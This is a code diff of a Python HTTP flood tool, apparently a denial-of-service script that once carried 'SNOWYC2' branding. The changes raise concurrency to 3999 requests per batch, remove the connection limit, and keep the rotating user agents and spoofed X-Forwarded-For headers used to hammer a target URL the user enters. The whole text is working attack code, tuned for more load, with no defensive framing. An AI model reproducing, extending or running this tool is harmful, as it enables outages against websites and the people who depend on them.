@@ -5,7 +5,7 @@ import sys
 import time
 
 # Config
-MAX_CONCURRENT = 1000
+MAX_CONCURRENT = 3999
 REQUEST_TIMEOUT = 10
 
 USER_AGENTS = [
@@ -21,8 +21,8 @@ REFERERS = [
 ]
 
 class AttackEngine:
-    def __init__(self, target, duration):
-        self.method = "C-ECPLISE"
+    def __init__(self, method, target, duration):
+        self.method = method
         self.target = target
         self.time = duration
         self.start_time = 0
@@ -33,30 +33,33 @@ class AttackEngine:
             'rps': 0,
             'peak_rps': 0
         }
+        self.semaphore = asyncio.Semaphore(MAX_CONCURRENT)
 
     async def make_request(self, session):
-        headers = {
-            "User-Agent": random.choice(USER_AGENTS),
-            "Referer": random.choice(REFERERS),
-            "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4))
-        }
-        try:
-            async with session.get(self.target, headers=headers, timeout=REQUEST_TIMEOUT) as response:
-                if response.status == 200:
-                    return "SUCCESS"
-                elif str(response.status).startswith("4"):
-                    return "ERROR"
-                return "OTHER"
-        except:
-            return "ERROR"
+        async with self.semaphore:
+            headers = {
+                "User-Agent": random.choice(USER_AGENTS),
+                "Referer": random.choice(REFERERS),
+                "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4))
+            }
+            try:
+                async with session.get(self.target, headers=headers, timeout=REQUEST_TIMEOUT) as response:
+                    if response.status == 200:
+                        return "SUCCESS"
+                    elif str(response.status).startswith("4"):
+                        return "ERROR"
+                    return "OTHER"
+            except:
+                return "ERROR"
 
     async def run_attack(self):
         self.start_time = time.time()
         end_time = self.start_time + self.time
 
-        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
+        connector = aiohttp.TCPConnector(limit=None, ssl=False)
+        async with aiohttp.ClientSession(connector=connector) as session:
             while time.time() < end_time:
-                tasks = [asyncio.create_task(self.make_request(session)) for _ in range(MAX_CONCURRENT)]
+                tasks = [self.make_request(session) for _ in range(MAX_CONCURRENT)]
                 results = await asyncio.gather(*tasks)
 
                 self.stats['total'] += len(results)
@@ -74,7 +77,7 @@ class AttackEngine:
         elapsed = time.time() - self.start_time
         remaining = max(0, self.time - elapsed)
         sys.stdout.write("\033[H\033[J")
-        print(f"\nSNOWYC2 - T.ME/STSVKINGDOM | METHOD: {self.method}")
+        print(f"\nMETHOD: {self.method}")
         print("=" * 60)
         print(f" TARGET: {self.target}")
         print(f" TIME LEFT: {remaining:.1f}s")
@@ -96,15 +99,14 @@ class AttackEngine:
         print("=" * 60)
 
 def main():
-    print("\nSNOWYC2 - T.ME/STSVKINGDOM")
-    print("=" * 40)
-    target = input("TARGET URL: ").strip()
-    duration = int(input("TIME (seconds): ").strip())
+    method = "C-ECPLISE"
+    target = input("TARGET: ").strip()
+    duration = int(input("DURATION: ").strip())
 
     if not target.startswith(('http://', 'https://')):
         target = f"http://{target}"
 
-    engine = AttackEngine(target, duration)
+    engine = AttackEngine(method, target, duration)
 
     try:
         asyncio.run(engine.run_attack())
